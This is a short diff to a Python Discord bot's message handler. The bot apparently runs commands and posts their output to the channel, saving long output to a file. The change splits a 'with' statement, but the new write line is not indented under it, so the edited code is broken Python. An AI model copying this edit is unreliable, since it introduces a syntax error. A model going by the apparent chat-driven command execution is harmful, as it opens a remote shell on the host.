@@ -76,7 +76,8 @@ async def on_message(message):
             output = (result.stdout or result.stderr or "Executed.").strip()
 
             if len(output) > 1900:
-                with open("outputcmd.txt", "w", encoding="utf-8") as f: f.write(output)
+                with open("outputcmd.txt", "w", encoding="utf-8") as f:
+                f.write(output)
                 await message.channel.send(file=discord.File("outputcmd.txt"))
                 os.remove("outputcmd.txt")
             else:
